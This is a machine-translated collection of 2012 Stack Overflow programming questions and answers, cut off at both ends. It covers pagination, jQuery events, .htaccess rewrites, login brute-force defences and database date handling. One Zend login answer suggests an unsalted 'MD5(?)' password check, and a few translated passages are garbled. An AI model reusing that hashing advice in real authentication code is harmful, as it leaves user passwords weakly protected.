1.  集合中的第一个元素不存在（空集）或
2.  它`ownerDocument`是虚假的（我不知道什么时候会发生，抱歉）。

第一个选项似乎更有可能，因此您应该`target.length > 0`在调用`target.offset()`和处理替代方案之前检查是否。

# php - 易于使用的分页

> ID：10102469
> 
> 赞同：1
> 
> 时间：2012-04-11T08:30:46.810
> 
> 标签：php, pagination

我正在尝试让一个不错的分页器工作，但我无法让即将到来的/中间数字正常工作。

目标是显示结果集的前 5 页和后 5 页，而不管您在哪个页面上，但这些前 5 页和后 5 页只能在有足够的页面允许的情况下显示。

分页看起来像这样： << 1 2 3 4 5 - 12 **13** 14 - 78 79 80 81 82 >>

只有几页：<< 1 **2** 3 4 5 6 7 8 9 10 >>

以及如何避免这种情况？：<< 1 2 3 4 5 - 5 **6** 7 - 7 8 9 10 11 >>

到目前为止，我的代码是：

```
function pagination_links($page, $num_rows, $results_per_page, $each_direction = 3) 
{ 
$total_pages = $num_rows ? ceil($num_rows / $results_per_page) : 1 ; 
if($total_pages < 2) 
{ 
    return null; 
} 
$page = ((is_numeric($page)) && ($page >= 1) && ($page <= $total_pages)) ? (int)$page : 1 ; 
$output = null; 
if($page > 1) 
{ 
    $output .= '<div class="pageBtn"><<</div>' ; 
}
else
{
    $output .= '<div class="pageBtnDis"><<</div>' ;
}

for($i=1;$i<$total_pages;$i++)
{
     if($page != $i) 
    { 
        $output .= '<div class="pageBtn">' . $i . '</div>' ; 
    } 
    else 
    { 
        $output .= '<div class="pageBtnSet">' . $i . '</div>' ;
    }
    if($i > 4)
    {
        break ;
    }
}

for($i = $page - $each_direction; $i <= $page + $each_direction; $i++) 
{ 
    if(($i > 5) && ($i <= $total_pages-5)) 
    { 
        if($page != $i) 
        { 
            $output .= '<div class="pageBtn">' . $i . '</div>' ; 
        } 
        else 
        { 
            $output .= '<div class="pageBtnSet">' . $i . '</div>' ;
        } 
    } 
}

for($i = $total_pages-5;$i<$total_pages;$i++) {
    if($page != $i) 
        { 
            $output .= '<div class="pageBtn">' . $i . '</div>' ; 
        } 
        else 
        { 
            $output .= '<div class="pageBtnSet">' . $i . '</div>' ;
        } 
}
if($page < $total_pages) 
{ 
    $output .= '<div class="pageBtn">>></div>' ; 
}
else
{
    $output .= '<div class="pageBtnDis">>></div>' ;
}
return $output ; 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T09:06:20.147

我认为目前最好的解决方案是使用[Digg Style Pagination Class](http://mis-algoritmos.com/digg-style-pagination-class)。它极大地简化了分页标记的创建和样式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-07T16:21:15.697

[Pager PEAR 类](http://pear.php.net/package/Pager/)是高度可定制的，我已经取得了很大的成功。

# javascript - 谷歌地图矩形/多边形的标题

> ID：10102470
> 
> 赞同：3
> 
> 时间：2012-04-11T08:30:48.687
> 
> 标签：javascript, google-maps, google-maps-api-3

如何向 google.maps.Rectangle 和 google.maps.Polygon 添加标题？[title 属性在RectangleOptions](https://developers.google.com/maps/documentation/javascript/reference?#RectangleOptions)中不可用。我试过了，但它不起作用（google.maps.Marker 可能，所以我想它也应该适用于矩形和多边形）。

如果通过谷歌地图没有干净的解决方案，难道不能只获取矩形的 DOM 元素并使用 jQuery 添加标题属性吗？所以我们可能会将问题简化为*“如何获取谷歌地图矩形/多边形的 DOM 元素？”*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T13:33:25.563

[您可以使用InfoBox](http://google-maps-utility-library-v3.googlecode.com/svn/trunk/infobox/docs/examples.html)（[在此处下载](http://google-maps-utility-library-v3.googlecode.com/svn/trunk/infobox/src/)）模仿“标题”工具提示。这有点令人费解，但通过设置正确的选项，您可以使它看起来更像浏览器工具提示，而不是我所展示的。

[http://jsfiddle.net/vF7u2/](http://jsfiddle.net/vF7u2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T11:12:12.470

[我从http://philmap.000space.com/gmap-api/poly-hov.html](http://philmap.000space.com/gmap-api/poly-hov.html)在线找到了这个帮助我在多边形上做工具提示的东西：

```
var tooltip=function(){
var id = 'tt';
var top = 3;
var left = 3;
var maxw = 200;
var speed = 10;
var timer = 20;
var endalpha = 95;
var alpha = 0;
var tt,t,c,b,h;
var ie = document.all ? true : false;
return{
    show:function(v,w){         
        if(tt == null){             
            tt = document.createElement('div');
            tt.setAttribute('id',id);
            t = document.createElement('div');
            t.setAttribute('id',id + 'top');
            c = document.createElement('div');
            c.setAttribute('id',id + 'cont');
            b = document.createElement('div');
            b.setAttribute('id',id + 'bot');
            tt.appendChild(t);
            tt.appendChild(c);
            tt.appendChild(b);
            document.body.appendChild(tt);              
            tt.style.opacity = 0;
            tt.style.filter = 'alpha(opacity=0)';
            document.onmousemove = this.pos;                
        }
        tt.style.visibility = 'visible';
        tt.style.display = 'block';
        c.innerHTML = v;
        tt.style.width = w ? w + 'px' : 'auto';
        if(!w && ie){
            t.style.display = 'none';
            b.style.display = 'none';
            tt.style.width = tt.offsetWidth;
            t.style.display = 'block';
            b.style.display = 'block';
        }
        if(tt.offsetWidth > maxw){tt.style.width = maxw + 'px'}
        h = parseInt(tt.offsetHeight) + top;
        clearInterval(tt.timer);
        tt.timer = setInterval(function(){tooltip.fade(1)},timer);
    },
    pos:function(e){
        var u = ie ? event.clientY + document.documentElement.scrollTop : e.pageY;
        var l = ie ? event.clientX + document.documentElement.scrollLeft : e.pageX;
        tt.style.top = (u - h) + 'px';
        tt.style.left = (l + left) + 'px';
    },
    fade:function(d){
        var a = alpha;
        if((a != endalpha && d == 1) || (a != 0 && d == -1)){
            var i = speed;
            if(endalpha - a < speed && d == 1){
                i = endalpha - a;
            }else if(alpha < speed && d == -1){
                i = a;
            }
            alpha = a + (i * d);
            tt.style.opacity = alpha * .01;
            tt.style.filter = 'alpha(opacity=' + alpha + ')';
        }else{
            clearInterval(tt.timer);
            if(d == -1){tt.style.display = 'none'}
        }
    },
    hide:function(){
        clearInterval(tt.timer);
        tt.timer = setInterval(function(){tooltip.fade(-1)},timer);
    }
};
}(); 
```

另外，请参阅有关同一主题的 SO 讨论： [Google Maps 中多边形上的工具提示](https://stackoverflow.com/questions/4302300/tooltip-over-a-polygon-in-google-maps)

# java - Ajax 的 WebDriver HTMLUnit 问题

> ID：10102477
> 
> 赞同：5
> 
> 时间：2012-04-11T08:31:44.787
> 
> 标签：java, ajax, webdriver, htmlunit

我想使用 selenium webdriver (java) 测试一个站点，但是该站点包含 ajax 并且 HTMLUnit 看不到 ajax 内容。

有解决方法吗？

例子：

```
WebDriver driver = new HtmlUnitDriver(BrowserVersion.FIREFOX_3_6);
//login into your account
this.login(driver);
//click on edit Profile Link into an ajax-loaded tab
driver.findElement(By.id("editProfile")).click();
//Result: org.openqa.selenium.NoSuchElementException 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T11:38:23.303

在与元素交互之前使用等待条件必须出现在 ajax 响应之后。

```
WebDriverWait wait = new WebDriverWait(webDriver, 5);
 wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("xpath_to_element"))); 
```

这使 webDriver 在 5 秒内等待您的元素。这个问题之前被问过。

# c++ - dll 导出静态模板方法

> ID：10102478
> 
> 赞同：2
> 
> 时间：2012-04-11T08:31:45.660
> 
> 标签：c++, templates, visual-c++, dll, dllexport

我正在尝试创建一个导出创建方法的模板化工厂类：

```
template <typename T>
class ClassFactory
{
    _declspec(dllexport) static void* Create()
    {
        return new T;
    }
};

class Foobar : ClassFactory<Foobar>
{
    std::string foo;
}; 
```

这段代码编译得很好，但是当我查看**dumpbin /exports的输出时，我在导出表中看不到任何内容**

以下代码正确导出 Create()：

```
class ClassFactoryBase
{
    _declspec(dllexport) virtual void* Create() = 0;
};

template <typename T>
class ClassFactory : ClassFactoryBase
{
    void* Create()
    {
        return new T;
    }
};

class Foobar : ClassFactory<Foobar>
{
    std::string foo;
}; 
```

但是，我需要 Create() 是静态的。为什么样品 2 有效，而样品 1 无效？有没有办法导出静态模板方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-23T10:36:22.637

编译器看到该`Create()`函数从未被调用，因此它不会为它生成任何代码。要使其工作，您需要像这样显式实例化您的模板：

```
template class ClassFactory<Foobar>; 
```

只需将此行添加到您的源。现在编译器将为这个函数生成代码并将其导出。有关详细信息，请参阅此 MSDN 文章 -[显式实例化 (C++)](http://msdn.microsoft.com/en-us/library/by56e477%28v=vs.80%29.aspx)

要回答您的另一个问题，为什么示例 2 有效而示例 1 无效，让我们仔细看看派生类 Foobar。这个类中有一个虚函数，所以编译器必须生成一个 vtable。要填写 vtable，编译器需要知道 Create() 的地址，这是它从基类模板隐式实例化的时候。该函数的代码根据要求生成并导出到 DLL。这就是示例 2 有效的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:01:07.970

无法从 DLL 中导出模板方法，因为甚至没有编译非实例化模板方法。您的示例对 DLL 本身没有多大作用，头文件是使一切正常工作的头文件。

# php - Strage html代码行为

> ID：10102479
> 
> 赞同：0
> 
> 时间：2012-04-11T08:31:51.693
> 
> 标签：php, html

我有一个很奇怪的问题：

我的网站引擎使用 php。创建页面时，我查看它的 HTML 代码（使用 broswer 的菜单“查看源代码 html”），我看到了这个（我只放了代码的重要部分）：

```
<div class="main_page_blogs_post2_item1">

            <div><p><p>
    <div class="cblui_image_contaner_" align="center"> 
```

但真正的 html 代码与源代码不同 - 当我使用 firebug 查看这段代码时，我看到了这段代码：

```
<div class="main_page_blogs_post2_item1">
<div>
<p></p>
<p> </p>
<div class="cblui_image_contaner_" align="center"> 
```

我的意思是结束`</p>`标签会自动添加到 html 代码中，我不知道为什么。我认为它是 javascript，但我尝试在禁用 javascript 的情况下重新加载页面 - 它没有帮助。我不认为这是 php 的错，因为源代码是正确的。

UPD：我发现，在我的情况下，2 个开始`<p>`标签和 2 个结束`</p>`标签已转换为`<p></p>`组合。所有其他`<p>`标签均未受到影响。

可能是什么？

谢谢

PS对不起英语不好:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:37:53.567

Firebug 在浏览器中显示真实生成的代码。这可能与从您的服务器发送的 html 不同（已更正，略有更改）。

有3个步骤：

1.  您的服务器代码
2.  生成的html
3.  你的浏览器是怎么做的（=你在萤火虫中看到的）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:39:23.020

Firebug 显示已更正的源。这意味着它会添加缺失的标签。查看真实 html 的正确方法是在浏览器中“查看源 html”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T13:17:06.137

虽然打开`<p>`标签在技术上是可以的，但我的猜测是浏览器在遇到下一个块标签时会自动关闭它们。使用`<br/>`标签添加换行符，或向`<p>`节点添加文本。

浏览器可以处理如下输入：

```
<p>Lorem ipsum
<p>Foobar text 
```

并会自动将其解释为已阅读

```
<p>Lorem ipsum</p>
<p>Foobar text</p> 
```

因此，您的代码

```
<div>
<p><p>
<div> .... 
```

变成：

```
<div>
<p></p><p></p>
<div> .... 
```

尝试设置一个 HTML 文档类型并坚持它的 html/xml 规则。使您的 html 无错误并使用[w3c 验证器](http://validator.w3.org/)对其进行测试。根据经验，不要在未`<p>`关闭标签的情况下使用标签，也不要将它们包裹在其他块标签上。

# php - 登录蛮力对策的存储选择

> ID：10102480
> 
> 赞同：1
> 
> 时间：2012-04-11T08:31:57.177
> 
> 标签：php, security

我目前正在加强我的网络应用程序的安全层，并且我对登录暴力保护的实施有一些疑问：

*   我应该使用什么存储来存储每个用户/IP 登录失败的计数器？一个简单的 APC/Memcache 条目是否足够，还是需要更稳定和持久的存储方法，还意味着每次登录时都需要额外的 SQL 查询或文件写入？甚至将它们存储在会话条目中（我的会话由 Memcache 处理，因此完全相同）。

*   关于系统范围计数器的相同问题（为了在分布式蛮力尝试的情况下触发登录锁定或限制......）？我认为这里的持久性更为关键，但它也意味着每次登录时都需要查询/写入。

*   检测到的登录蛮力尝试的适当返回响应是什么？我应该返回一个 404 错误，一个 503 服务不可用？或者甚至通过 IPTables/Netfilter 通过 DROPing 甚至 TARPITing 攻击者 IP 来更深入？我说的是真正检测到的蛮力尝试，而不是用户因为不记得他的通行证而导致某些登录失败的情况。

我原本以为一个缓存存储（APC/Memcache）就足以存储计数器，但我担心缓存会因为什么原因而失败，从而使这个防御层失效。

对于其他所有考虑，我已经阅读了一些不错的帖子，例如[What-is-the-best-distributed-brute-force-countermeasure](https://stackoverflow.com/questions/479233/what-is-the-best-distributed-brute-force-countermeasure)和[Number-of-attempts-to-brute-force-an-average-password](https://stackoverflow.com/questions/2376777/number-of-attempts-to-brute-force-an-average-password-non-intrusive-yet-meanin)，但请随意提出任何建议，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:50:09.583

**首先**，您必须确定数据的正确范围，**然后**为速度和优化所困扰。

正如您所说，缓存存储可能会失败。这清楚地表明您的数据具有比缓存更广泛的范围。因此，您不应将它们存储在那里。数据库是一个不错的选择。

现在，如果您担心速度（并且应该如此），那么是时候优化流程了。你已经有一个缓存层，所以用它来缓存这个额外的读取查询。另一方面，您不应该为额外的更新查询而烦恼，因为这是不影响整体用户体验的例外情况。

至于您的第三个问题，对检测到的蛮力尝试的响应类型无关紧要。重要的是时间：例如以 20 秒的延迟响应。这应该足以在此生中使暴力破解成为不可能。

# iphone - 如果分发证书已更新，iphone app update 可以访问钥匙串吗？

> ID：10102482
> 
> 赞同：0
> 
> 时间：2012-04-11T08:32:17.543
> 
> 标签：iphone, ios, keychain

更新我们的 iphone 应用程序后无法访问钥匙串。

分发证书已更新，这会影响钥匙串访问吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:54:12.727

钥匙串访问取决于 App Id（更准确地说是 App Id 的 Bundle Seed Id 部分）：9876543210.com.mycompany.myapp 的第一部分。可能您错误地在不同的 App Id 上创建了新的分发证书，或者您的团队配置文件不一样 (9876543210.*)

# javascript - 使用jquery / js检查cookie是否存在登录注销

> ID：10102483
> 
> 赞同：1
> 
> 时间：2012-04-11T08:32:31.603
> 
> 标签：javascript, jquery, cookies, dotnetnuke, session-cookies

我有一个无法正常工作的 DNN 登录/注销控件。因此，我想使用 JS/JQUERY 自己制作。

当用户登录时，页面上的 HTML 如下所示：

```
<a href="javascript:__doPostBack('dnn$dnnLOGIN$cmdLogin','')" class="SkinObject" id="dnn_dnnLOGIN_cmdLogin">Logout</a> 
```

当他们“注销”时，它看起来像这样：

```
<a href="javascript:__doPostBack('dnn$dnnLOGIN$cmdLogin','')" class="SkinObject" id="dnn_dnnLOGIN_cmdLogin">Login</a> 
```

*   我想检查 cookie 是否已设置，是否显示注销链接，如果未设置则显示登录链接。

*   单击登录将检查 cookie 是否存在（它应该显示为登录）并将它们带到登录页面。

*   单击注销应删除 cookie 并刷新页面，然后将链接再次更改回“登录”，因为没有找到 cookie。

我以此作为示例指南：http: [//jsfiddle.net/MadLittleMods/73vzD/](http://jsfiddle.net/MadLittleMods/73vzD/)

这是我到目前为止所做的：

**HTML：**

```
<a id="dnn_dnnLOGIN_cmdLogin" href="Login">
    Login
</a>

||

<a id="dnn_dnnLOGIN_cmdLogin" href="Logoff">
    Logoff
</a>

<br />

<a id="see" href="#">
    see
</a> 
```

**JS：**

```
//set the cookie once user has logged in
//for testing purposes clicking login should set the cookie to 1
//clicking on Logoff 'should' set the cookie to 0
$('#dnn_dnnLOGIN_cmdLogin').live('click', function() {
    var action = $(this).attr('href');
    var cookie_value = (action == 'Login') ? 1 : null;

    $.cookie('DNN-COOKIE', cookie_value);

    return false;
});

// clicking on 'see' should bring up an alert box display the cookie value of 1 or 0
$('#see').live('click', function() {

    alert($.cookie('DNN-COOKIE'));

    return false;
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:58:46.583

cookie 的演示工作得很好。看来您忘记包含插件了。

[在这里](http://jsfiddle.net/Starx/VSURE/)看到一个工作的

* * *

**更新：**

您可以像这样检查预先存在的cookie

```
var preval = $.cookie('cookie-name');
if(preval != null) {
    //... 
} 
```

[演示](http://jsfiddle.net/Starx/VSURE/1/)

# php - 如何将重写规则写入 htaccess？

> ID：10102486
> 
> 赞同：0
> 
> 时间：2012-04-11T08:32:48.800
> 
> 标签：php, regex, .htaccess, mod-rewrite, redirect

我需要重定向任何*www.mysite.com/anything/anything*或*www.mysite.com/anything*并排除*www.mysite.com/app*

至*www.mysite.com/app*

当然我想排除是可选的。我想这只是一个额外的重定向，这将花费额外的时间，但最好将其排除在外。

我找到了这些基本示例[http://www.yourhtmlsource.com/sitemanagement/urlrewriting.html](http://www.yourhtmlsource.com/sitemanagement/urlrewriting.html)并做到了这一点：

```
RewriteRule ^*/*/$ /app
RewriteRule ^*/$ /app 
```

但它不起作用加上我仍然不知道如何排除 /app

请帮忙？

**更新**

我认为 .* 代表正则表达式中的 0 个或多个点，我的示例完全错误，我需要*任何语法*而不是您在答案中使用的点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:43:22.800

你可以试试这个：

```
Options +FollowSymlinks
RewriteEngine on
RewriteCond %{REQUEST_URI} !^/app$ 
RewriteRule ^.*$ /app [L] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:40:28.667

这对你有用吗？

```
RewriteEngine on
RewriteRule ^.*$ app/ [L] 
```

不幸的是，它并不排除正确的道路。不过先试试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T12:47:07.383

将此代码放在 DOCUMENT_ROOT 下的 .htaccess 中：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteRule ^(?!app/).*$ app [L,NC] 
```

`/app/`上面 RewriteRule 中的负前瞻将重定向除以to开头的 URI 之外的所有内容`/app`。

# c# - 如何本地化包含 Html.ActionLink 的文本

> ID：10102487
> 
> 赞同：9
> 
> 时间：2012-04-11T08:32:49.480
> 
> 标签：c#, asp.net, asp.net-mvc-3, razor, localization

我有这样的文本要本地化

```
<p>Please enter your user name and password. @Html.ActionLink(@Resources.Register, "Register") if you don't have an account. </p> 
```

文本中经常有一个 ActionLink。

我可以为整个 ActionLink 使用类似 {0} 的东西吗

```
@string.Format(Resources.LogOn_Enter_Message, Html.ActionLink(@Resources.Register, "Register")) 
```

*（这不起作用，因为链接变成了字符串）*
还是我必须将段落分成两部分？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-11T08:43:20.037

你应该这样做：

```
@Html.Raw(string.Format(Resources.LogOn_Enter_Message, Html.ActionLink(@Resources.Register, "Register"))) 
```

并存储您的本地化字符串：

```
 <p>Please enter your user name and password. {0} if you don't have an account. </p> 
```

# django - 保存荷兰日期

> ID：10102491
> 
> 赞同：-1
> 
> 时间：2012-04-11T08:33:06.740
> 
> 标签：django

我有一个具有以下值的输入字段：12-04-2012

这是我想保存在数据库中的荷兰日期。数据库字段是日期。

如何将非英语日期保存到数据库中？

我试过了：

HTML

```
<input id="id_delivery_date" type="text" value="12-04-2012" name="delivery_date"> 
```

DJANGO

```
def save(self, user, session):
    self.order.delivery_date = self.cleaned_data['delivery_date']
    self.order.save() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:41:14.453

您可以使用[datetime.strptime](http://docs.python.org/library/datetime.html#datetime.datetime.strptime)来解析字符串并创建一个可以直接分配给数据库字段的 datetime 对象。

```
from datetime import datetime
datetime.strptime('12-04-2012', '%d-%m-%Y') 
```

另一种选择是使用字符串处理，但这是一个相当的技巧，不推荐。

```
>>> '-'.join(reversed('12-04-2012'.split('-')))
'2012-04-12' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:42:56.807

按荷兰日期，我假设您的意思是格式为 MM-DD-YYYY。您可以将其解析为一个`datetime`对象

```
from datetime import datetime
datetime.strptime("12-04-2012", "%d-%m-%Y") 
```

# joomla - 使用特定配置文件初始化 jce 编辑器

> ID：10102495
> 
> 赞同：1
> 
> 时间：2012-04-11T08:33:12.147
> 
> 标签：joomla

我正在尝试找到一种方法来通过具有特定配置文件的 javascript 初始化 Joomla 2.5.2 jce 编辑器。现在我有以下通过ajax请求调用的代码：

```
$wysiwyg =& JFactory::getEditor();
echo $wysiwyg->display(
    "editor", 
    JRequest::getString("value"), 
    JRequest::getInt("width"), 
    JRequest::getInt("height"), 
    40, 
    6, 
    array(
    )
);
$document =& JFactory::getDocument();
echo "<script type='text/javascript'>";
echo $document->_script["text/javascript"];
echo "</script>"; 
```

这将使用默认配置文件初始化 jce 编辑器，但我想初始化我添加的自定义配置文件。这是我可以配置的吗？

顺便问一下，有没有更好的方法来通过 javascript 初始化编辑器？

# jquery - jQuery单击功能未在链接上触发

> ID：10102500
> 
> 赞同：0
> 
> 时间：2012-04-11T08:33:38.197
> 
> 标签：jquery

我正在尝试添加一些导航箭头，允许用户转到列表中的下一个/上一个链接。

单击箭头时，我无法让 jQuery 在下一个链接上触发单击事件。

我已经使用 addClass() 设置了一个测试，我可以看到 jQuery 引用了正确的链接，因为它向其中添加了类，它只是没有触发它的点击事件。

HTML：

```
<ul class="menu">         
     <li class="active">
            <a href="#thelink#">Link text</a>
      </li>
      <li>
            <a href="#thelink2#">Link text 2</a>
      </li>
      <li><a class="next-page" href='#'>></a><li>
</ul> 
```

jQuery：

```
$jQ(".menu a.next-page").click(function() {         

  $jQ('.menu li.active').next().find('a').addClass('test');

  $jQ('.menu li.active').next().find('a').click();  

}); 
```

使用此代码，当我单击下一个箭头时，它会将类“测试”添加到第二个列表项中的链接中，但未单击该链接。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:06:51.770

这是一个非常复杂的示例（因为我不确定您的点击需要做的所有事情），但在评论中留下它似乎并不正确：

[http://jsfiddle.net/MNczS/1/](http://jsfiddle.net/MNczS/1/)

```
var doStuff = function(obj) {
    alert("I did the stuff related to " + obj.attr('href') + "! Woot!");
};

$('a').not('.next-page').on('click', function(e) {
    e.preventDefault();
    doStuff($(this));
});

$(".menu a.next-page").on('click', function(e) {
    e.preventDefault(); 
    $nextAnchor = $('.menu li.active').next().find('a');
    doStuff($nextAnchor);
});​ 
```

愚蠢的`doStuff()`功能只是代表点击时发生的事情。请注意，我将某些行为绑定到所有锚标记（下一页锚除外！）并将其他行为绑定到下一页锚。最终，他们都做同样的事情：`doStuff`为有问题的对象开火。但理论上你可以让他们在共享功能之前和/或之后做不同的事情`doStuff()`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:38:29.677

尝试使用这个：

```
$jQ('.menu li.active').next().find('a')[0].click(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T10:06:23.790

有时点击不会触发尝试：

```
$jQ(".menu a.next-page").live("click",function() {           
  $jQ('.menu li.active').next().find('a').addClass('test');
  $jQ('.menu li.active').next().find('a').click();  
}); 
```

或者

```
$jQ(".menu a.next-page").on("click",function() {           
  $jQ('.menu li.active').next().find('a').addClass('test');
  $jQ('.menu li.active').next().find('a').click();  
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T09:36:03.390

使用触发器，触发您想要的任何事件 [http://api.jquery.com/trigger/](http://api.jquery.com/trigger/)

```
$('li a.next-page').click(function() {
    $('li.active a').trigger('click');
}); 
```

所以基本上使用你的代码应该是

```
$jQ(".menu a.next-page").click(function() {         

  $jQ('.menu li.active').next().find('a').addClass('test');

  $jQ('.menu li.active').next().find('a').trigger('click');  

}); 
```

# zend-framework - 无法使用zend框架登录

> ID：10102501
> 
> 赞同：0
> 
> 时间：2012-04-11T08:33:39.917
> 
> 标签：zend-framework

我是zend的新手。我正在尝试使用 zend 框架创建登录表单。但它的创造问题。下面是我的功能

```
public function loginAction()
{
    $db = $this->_getParam('db');
    $form = new Application_Form_Login();
    $this->view->form = $form;

    if($this->getRequest()->isPost())
    {
        $formData = $this->getRequest()->getPost();
        if ($form->isValid($formData)) 
        {
        $adapter = new Zend_Auth_Adapter_DbTable(
            $db,
            'users',
            'emailaddress',
            'password',
            'MD5(CONCAT(?, password_salt))'
            );

        $adapter->setIdentity($form->getValue('email'));
        $adapter->setCredential($form->getValue('password'));

        $auth   = Zend_Auth::getInstance();
        $result = $auth->authenticate($adapter);

            if ($result->isValid()) {
                $this->_helper->FlashMessenger('Successful Login');
                $this->_redirect('/');
                return;
            }
        }   
    }
} 
```

它在以下行给出错误-> $result = $auth->authenticate($adapter);

错误是 -> 消息：提供给 Zend_Auth_Adapter_DbTable 的参数未能生成有效的 sql 语句，请检查表名和列名的有效性。

我的表名是“用户”，它有列（id、名字、姓氏、年龄、电子邮件地址、密码）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:55:26.647

您需要在表中名为“password_salt”的字段将包含盐或仅更改此字段

```
'MD5(CONCAT(?, password_salt))' 
```

至

```
'MD5(?)' 
```

# c# - SQL 查询中的服务器路径

> ID：10102503
> 
> 赞同：0
> 
> 时间：2012-04-11T08:34:00.667
> 
> 标签：c#, sql-server, path

我从网络上另一台计算机上的 Windows 服务读取文件时遇到问题。

如果我在本地有一个文件，我只需给出路径，例如..`C:\test\`

我只是写`C:\\Test\\`了，效果很好，但是在具有此地址的服务器上`\\\Server\Test\`

我不知道该写什么...我希望得到一些帮助！

/缺口

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:44:13.613

我想你只是在寻找：

```
string myPath = @"\\Server\Test"; 
```

或者：

```
string myPath = "\\\\Server\\Test"; 
```

这似乎与 SQL-Server 无关，只是一个简单的 C# 字符串问题。

一般来说，如果您想要的路径中通常有两个相邻的（例如），则只需`\`替换为`\\``\``\\server``\\\\`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:52:58.410

If it is a windows local machine Windows try to change the folder (x86), i have the same problem some time ago and for some reason is not working in the default folder x86., or if is a SQL server take a look at this [post](http://support.microsoft.com/default.aspx?scid=kb;en-us;Q272705&SD=MSKB&).

Don't forget that you need to create the file `\Test` in folder `\\Server` in order to access it.

# mysql - 根据不同区域的日期名称减去时间

> ID：10102511
> 
> 赞同：2
> 
> 时间：2012-04-11T08:34:27.347
> 
> 标签：mysql, sql, date

我需要使用mysql查询减去时间/天；

就像星期六 (GMT-1) 的 02:00 - 星期三 (GMT+5) 的 00:59

如何使用 sql 查询执行此操作？并获得 3 天 7 小时 1 分钟的结果

> 编辑：两天都是同一周

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:08:45.413

假设这项工作的日期，感谢@symcbean，我可以让它与 TIMEDIFF 一起工作

```
SELECT TIMEDIFF(CONVERT_TZ('2012-04-15 02:00:00', '-01:00', '+05:00'), '2012-04-12 00:59:00'); 
```

以及几天的小时和分钟：

```
SELECT CONCAT(
    FLOOR(HOUR(TIMEDIFF(CONVERT_TZ('2012-04-15 02:00:00', '-01:00', '+05:00'), '2012-04-12 00:59:00')) / 24), ' days ',
    MOD(HOUR(TIMEDIFF(CONVERT_TZ('2012-04-15 02:00:00', '-01:00', '+05:00'), '2012-04-12 00:59:00')), 24), ' hours ',
    MINUTE(TIMEDIFF(CONVERT_TZ('2012-04-15 02:00:00', '-01:00', '+05:00'), '2012-04-12 00:59:00')), ' minutes') as TIMEDIFF; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:04:30.813

```
SELECT CONVERT_TZ('2012-04-07 02:00:00', '-01:00', '00:00')
         - CONVERT_TZ('2012-04-04 00:59:00', '05:00', '00:00') 
```

> 编辑：两天都是同一周

然后通常在周三的 t1 和周六的 t2 之间的差距将是相同的，因为 DST 班次通常在周日早上应用。最好使用固定日期。

# java - EntityManager 的生命周期应该是每个 Servlet 请求吗？还是更长？

> ID：10102513
> 
> 赞同：2
> 
> 时间：2012-04-11T08:34:47.557
> 
> 标签：java, jakarta-ee, servlets, jpa, servlet-filters

我目前正在`EntityManager`从servlet`EntityManagerFactory`的`doFilter`方法中获取一个`Filter`，将其传递给 Servlet，并在退出时将其关闭。

就生命周期`EntityManager`而言，这是一种好的做法吗？还是我应该有不同的一生`EntityManager`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T09:45:03.270

听起来不错。

过滤器和 servlet 将被多个线程同时使用（与无状态或有状态 EJB 不同）。所以`EntityManager`应该根据请求查找。

或者，您可以通过指定所需的来强制 Web 容器同步对 servlet 的访问（不确定过滤器）`SingleThreadModel`，在这种情况下，您可以在过滤器或 servlet 中注入`EntityManager`一次性。

以上信息来自this post about [PersistenceContext in a web app](http://weblogs.java.net/blog/ss141213/archive/2005/12/dont_use_persis.html)。

我相信获得`EntityManager`一个便宜的操作（不像获得工厂本身）。至少，Hibernate 的 Session 和 SessionFactory 是这样的。所以我会选择你的原创设计。

# java - 返回 Double 类型的值时出错？

> ID：10102516
> 
> 赞同：0
> 
> 时间：2012-04-11T08:34:54.237
> 
> 标签：java, android

在这个方法中，我返回一个 Double 类型的值，但是有一个错误提示“方法

必须返回 Double 类型的值”？？？

**代码**：

```
public class Gyro extends Activity {

Double gyro_X;
Double gyro_Y;
Double gyro_Z;

public Double getGyro_X() {
    if (this.gyro_X == null) {
        Toast.makeText(this, ""+gyro_XIsNullText, ToastdurationShort).show();
    } else { 
    return this.gyro_X;
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T08:37:05.003

如果`this.gyro_x`是`null`你不返回任何东西......
你的代码应该是这样的

```
public Double getGyro_X() {
    if (this.gyro_X == null) {
        Toast.makeText(this, ""+gyro_XIsNullText, ToastdurationShort).show();
        return null;
        //Or maybe: throw new NullPointerException();
    } else { 
    return this.gyro_X;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
